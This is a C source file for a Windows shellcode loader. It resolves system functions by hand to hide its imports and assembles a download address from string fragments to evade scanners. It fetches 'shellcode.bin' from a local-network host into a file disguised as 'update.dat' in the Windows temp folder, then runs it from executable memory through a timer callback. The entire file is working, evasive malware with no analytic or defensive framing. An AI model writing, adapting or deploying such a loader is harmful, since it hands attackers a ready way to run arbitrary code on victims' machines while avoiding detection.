#include <windows.h>
#include <urlmon.h>
#include "custom_crt.h"
#include "peb.h"
#include "strings.h"

typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef DWORD(WINAPI* pGetFileSize)(HANDLE, LPDWORD);
typedef HMODULE(WINAPI* pLoadLibraryW)(LPCWSTR);
typedef HRESULT(WINAPI* pURLDownloadToFileW)(LPUNKNOWN, LPCWSTR, LPCWSTR, DWORD, LPVOID);
typedef VOID(WINAPI* pSleep)(DWORD);
typedef BOOL(WINAPI* pCreateTimerQueueTimer)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef BOOL(WINAPI* pDeleteTimerQueueTimer)(HANDLE, HANDLE, HANDLE);

struct {
    pVirtualAlloc fnVirtualAlloc;
    pVirtualProtect fnVirtualProtect;
    pCreateFileW fnCreateFileW;
    pReadFile fnReadFile;
    pCloseHandle fnCloseHandle;
    pGetFileSize fnGetFileSize;
    pLoadLibraryW fnLoadLibraryW;
    pURLDownloadToFileW fnURLDownloadToFileW;
    pSleep fnSleep;
    pCreateTimerQueueTimer fnCreateTimerQueueTimer;
    pDeleteTimerQueueTimer fnDeleteTimerQueueTimer;
} g_API;

LPVOID g_shellcode = NULL;


volatile DWORD (WINAPI *g_GetLastError)() = GetLastError;

BOOL InitializeAPIs() {
    wchar_t dllName[256];
    char funcName[256];
    
    BuildKernel32(dllName);
    PVOID hKernel32 = GetModuleBaseByName(dllName);
    if (!hKernel32) return FALSE;
    
    BuildVirtualAlloc(funcName);
    g_API.fnVirtualAlloc = (pVirtualAlloc)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnVirtualAlloc) return FALSE;
    
    BuildVirtualProtect(funcName);
    g_API.fnVirtualProtect = (pVirtualProtect)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnVirtualProtect) return FALSE;
    
    BuildCreateFileW(funcName);
    g_API.fnCreateFileW = (pCreateFileW)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnCreateFileW) return FALSE;
    
    BuildReadFile(funcName);
    g_API.fnReadFile = (pReadFile)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnReadFile) return FALSE;
    
    BuildCloseHandle(funcName);
    g_API.fnCloseHandle = (pCloseHandle)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnCloseHandle) return FALSE;
    
    BuildGetFileSize(funcName);
    g_API.fnGetFileSize = (pGetFileSize)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnGetFileSize) return FALSE;
    
    BuildLoadLibraryW(funcName);
    g_API.fnLoadLibraryW = (pLoadLibraryW)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnLoadLibraryW) return FALSE;
    
    BuildSleep(funcName);
    g_API.fnSleep = (pSleep)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnSleep) return FALSE;
    
    BuildUrlmon(dllName);
    PVOID hUrlmon = g_API.fnLoadLibraryW(dllName);
    if (!hUrlmon) return FALSE;
    
    BuildURLDownloadToFileW(funcName);
    g_API.fnURLDownloadToFileW = (pURLDownloadToFileW)GetProcAddressByName(hUrlmon, funcName);
    if (!g_API.fnURLDownloadToFileW) return FALSE;
    
    BuildCreateTimerQueueTimer(funcName);
    g_API.fnCreateTimerQueueTimer = (pCreateTimerQueueTimer)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnCreateTimerQueueTimer) return FALSE;
    
    BuildDeleteTimerQueueTimer(funcName);
    g_API.fnDeleteTimerQueueTimer = (pDeleteTimerQueueTimer)GetProcAddressByName(hKernel32, funcName);
    if (!g_API.fnDeleteTimerQueueTimer) return FALSE;
    
    return TRUE;
}

BOOL DownloadFile(LPCWSTR url, LPCWSTR localPath) {
    HRESULT hr = g_API.fnURLDownloadToFileW(NULL, url, localPath, 0, NULL);
    return SUCCEEDED(hr);
}

LPVOID ReadShellcodeFile(LPCWSTR filePath, DWORD* pSize) {
    HANDLE hFile = g_API.fnCreateFileW(filePath, 0x80000000, 1, NULL, 3, 0x80, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;
    
    DWORD fileSize = g_API.fnGetFileSize(hFile, NULL);
    if (fileSize == 0xFFFFFFFF) {
        g_API.fnCloseHandle(hFile);
        return NULL;
    }
    
    LPVOID buffer = g_API.fnVirtualAlloc(NULL, fileSize, 0x3000, 0x04);
    if (!buffer) {
        g_API.fnCloseHandle(hFile);
        return NULL;
    }
    
    DWORD bytesRead;
    BOOL result = g_API.fnReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    g_API.fnCloseHandle(hFile);
    
    if (!result || bytesRead != fileSize) return NULL;
    
    *pSize = fileSize;
    return buffer;
}

VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    if (g_shellcode && lpParameter) {
        DWORD oldProtect;
        DWORD shellcodeSize = *(DWORD*)lpParameter;
        
        
        if (g_API.fnVirtualProtect(g_shellcode, shellcodeSize, 0x40, &oldProtect)) {
            
            ((void(*)())g_shellcode)();
        }
    }
}

int main() {
    
    if (g_GetLastError == NULL) return -1;
    
    if (!InitializeAPIs()) return 1;
    
    wchar_t downloadUrl[512];
    const wchar_t* urlParts[] = {
        L"ht", L"tp", L"://", L"192", L".", L"168", L".", 
        L"127", L".", L"153", L":", L"80", L"80", L"/",
        L"she", L"ll", L"co", L"de", L".", L"bi", L"n"
    };
    BuildWString(downloadUrl, urlParts, 21);
    
    wchar_t localPath[256];
    const wchar_t* pathParts[] = {
        L"C:", L"\\Win", L"dows", L"\\Tem", L"p\\",
        L"upd", L"ate", L".", L"dat"
    };
    BuildWString(localPath, pathParts, 9);
    
    if (!DownloadFile(downloadUrl, localPath)) return 2;
    
    g_API.fnSleep(500);
    
    DWORD shellcodeSize = 0;
    g_shellcode = ReadShellcodeFile(localPath, &shellcodeSize);
    if (!g_shellcode) return 3;
    
    
    LPVOID execMem = g_API.fnVirtualAlloc(NULL, shellcodeSize, 0x3000, 0x40);
    if (!execMem) return 4;
    
    my_memcpy(execMem, g_shellcode, shellcodeSize);
    g_shellcode = execMem;
    
    
    HANDLE hTimer = NULL;
    g_API.fnCreateTimerQueueTimer(&hTimer, NULL, TimerCallback, &shellcodeSize, 100, 0, 0);
    
    g_API.fnSleep(2000);
    
    if (hTimer) {
        g_API.fnDeleteTimerQueueTimer(NULL, hTimer, NULL);
    }
    
    return 0;
}

int mainCRTStartup() {
    return main();
}


